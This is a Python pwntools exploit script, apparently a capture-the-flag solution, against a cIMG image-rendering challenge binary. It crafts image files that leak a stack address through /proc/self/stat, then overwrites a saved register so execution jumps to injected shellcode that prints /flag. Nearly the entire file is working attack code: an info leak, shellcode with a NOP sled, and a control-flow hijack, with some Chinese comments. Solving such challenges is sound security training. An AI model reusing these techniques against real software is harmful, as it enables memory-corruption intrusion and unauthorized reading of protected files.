import os
import re
import struct

from pwn import *

# Context configuration
context.os = "linux"
context.arch = "amd64"
context.terminal = ["tmux", "splitw", "-h"]

# Target configuration
BIN_PATH = "/challenge/integration-cimg-screenshot-sc"
FLAG_PATH = "/flag"
LEAK_FILE = "/tmp/leak.cimg"
EXPLOIT_FILE = "/tmp/expl.cimg"

# CIMG Opcodes
OP_JUMP = 2
OP_RENDER = 4
OP_LOAD_FILE = 5
OP_SHOW = 6


def cimg_header(num_directives, width=255, height=1, version=4):
    return struct.pack("<4sHBBI", b"cIMG", version, width, height, num_directives)


def cimg_load_file(sprite_id, filename, width=255, height=1):
    data = struct.pack("<H", OP_LOAD_FILE)
    data += struct.pack("<BBB", sprite_id, width, height)
    data += filename.encode().ljust(width, b"\x00")
    return data


def cimg_render(sprite_id, x=0, y=0, r_off=0, g_off=0, b_off=0, w=255, h=1, channel=0):
    data = struct.pack("<H", OP_RENDER)
    data += struct.pack(
        "<BBBBBBBBB", sprite_id, x, y, r_off, g_off, b_off, w, h, channel
    )
    return data


def cimg_show():
    return struct.pack("<H", OP_SHOW) + b"\x00"


def extract_stat_addr(output):
    pattern = r"m(.)\x1b\[0m"
    matches = re.findall(pattern, output, re.DOTALL)
    text = "".join(matches)
    match = re.search(r"\b1407\d+\b", text)
    return int(match.group()) if match else None


def perform_leak():
    log.info("Attempting to leak stack address...")
    leak_payload = cimg_header(num_directives=3)
    leak_payload += cimg_load_file(1, "/proc/self/stat")
    leak_payload += cimg_render(1, channel=0)
    leak_payload += cimg_show()

    write(LEAK_FILE, leak_payload)

    io = process([BIN_PATH, LEAK_FILE], env={})
    output = io.recvall(timeout=5).decode(errors="ignore")
    io.close()

    stack_addr = extract_stat_addr(output)
    if not stack_addr:
        log.error("Failed to leak stack address from output.")
        exit(1)

    log.success(f"Leaked startstack: {hex(stack_addr)}")
    return stack_addr


def solve():
    stack_addr = perform_leak()

    # 在确保 argv 长度和 env 空白后，-1712 这个偏移将像手术刀一样精准
    shellcode_addr = stack_addr - 1712
    log.info(f"Targeting shellcode at: {hex(shellcode_addr)}")

    # 【关键修复 3】：利用 dword [rbx] + rbx 的逻辑构建安全跳板
    # 首部的 4 字节被解析为相对偏移: 0x00000004
    # jump 逻辑计算为: rax = rbx + 4，完美跳过自身，进入 NOP
    jump_offset = p32(4)
    nop_sled = b"\x90" * 28
    endbr64 = b"\xf3\x0f\x1e\xfa"  # 虽然 notrack 会忽略 IBT，但这保留了极客的体面
    shellcode = asm(shellcraft.cat(FLAG_PATH))

    # 构建并截断对齐
    sc_payload = (jump_offset + nop_sled + endbr64 + shellcode).ljust(136, b"\x00")

    # 在 136 偏移处精准覆盖 Saved RBX
    sc_payload += p64(shellcode_addr)
    sc_payload = sc_payload.ljust(255, b"\x00")

    write("/tmp/sc.bin", sc_payload)

    exp_payload = cimg_header(num_directives=4)
    exp_payload += cimg_load_file(1, "/tmp/sc.bin")
    exp_payload += cimg_render(1, channel=0xFE)
    exp_payload += struct.pack("<H", 1337) + struct.pack("<BBBBB", 2, 0, 0, 144, 1)
    exp_payload += struct.pack("<H", OP_JUMP)

    write(EXPLOIT_FILE, exp_payload)

    io = process([BIN_PATH, EXPLOIT_FILE], env={})

    res = io.recvall(timeout=5)
    print(res.decode(errors="ignore"))

    # io = gdb.debug(
    #     [BIN_PATH, EXPLOIT_FILE],
    #     env={"SHELL": "/bin/bash"},
    #     gdbscript="""
    #     b *0x00401ecf
    #     b *0x00401f64
    #     continue
    #     """,
    # )
    #
    # io.interactive()
    # (gdb) print/x $rsp + 0x10
    # $1 = 0x7fffffffdc00


if __name__ == "__main__":
    solve()

